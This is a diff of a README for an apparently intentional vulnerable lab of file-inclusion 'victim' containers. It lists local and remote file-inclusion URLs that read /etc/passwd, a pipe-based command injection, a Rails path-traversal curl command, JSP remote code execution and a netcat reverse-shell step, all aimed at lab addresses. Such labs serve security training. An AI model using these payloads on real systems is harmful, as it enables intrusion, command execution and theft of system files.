@@ -108,9 +108,35 @@ Upload runme.jsp from attacker_server_jsp for Remote Code Execution:
 - [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)
 - [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)
 
+## CGI / Perl
+
+Single Container: Start it in folder `victim_fi_server_cgi_perl`.
+
+### RFI
+
+[http://127.0.0.1:8895/cgi-bin/index.pl?file=https://www.google.de](http://127.0.0.1:8895/cgi-bin/index.pl?file=https://www.google.de)
+
+### LFI
+
+- /etc/passwd
+[http://127.0.0.1:8895/cgi-bin/index.pl?file=/etc/passwd](http://127.0.0.1:8895/cgi-bin/index.pl?file=/etc/passwd)
+
+- Outputs the current server folder:
+[http://127.0.0.1:8895/cgi-bin/index.pl?file=ls|](http://127.0.0.1:8895/cgi-bin/index.pl?file=ls|)
+
+## Rails
+
+Another single container: To Start goto `victim_fi_server_rails` folder.
+
+### LFI
+
+`curl -X GET -H 'Accept: ../../../../../../../etc/passwd{{' http://localhost:8896/fileinclusion`
+
 ## ASP / Razor
 
-Use [https://github.com/StefanScherer/windows-docker-machine](https://github.com/StefanScherer/windows-docker-machine) to get a windows docker environment
+Use [https://github.com/StefanScherer/windows-docker-machine](https://github.com/StefanScherer/windows-docker-machine) to get a windows docker environment on a non-windows machine.
+
+Then you can start a windows ASPX Razor network with a victim machine (use `start_win_network.sh` or `docker-compose -f lfi_win_network.yml up --build`). After that you can verify the following payloads:
 
 Upload the files and call:
 
@@ -131,19 +157,4 @@ Upload the files and call:
 nc -nlvp 4444 at attacker server, then:
 
 [http://192.168.99.90:8080/?test=RevShell.cshtml](http://192.168.99.90:8080/?test=RevShell.cshtml)
-
-## CGI / Perl
-
-### RFI
-
-[http://127.0.0.1:8895/cgi-bin/index.pl?file=https://www.google.de](http://127.0.0.1:8895/cgi-bin/index.pl?file=https://www.google.de)
-
-### LFI
-
-- /etc/passwd
-[http://127.0.0.1:8895/cgi-bin/index.pl?file=/etc/passwd](http://127.0.0.1:8895/cgi-bin/index.pl?file=/etc/passwd)
-
-- Outputs the current server folder:
-[http://127.0.0.1:8895/cgi-bin/index.pl?file=ls|](http://127.0.0.1:8895/cgi-bin/index.pl?file=ls|)
-
 
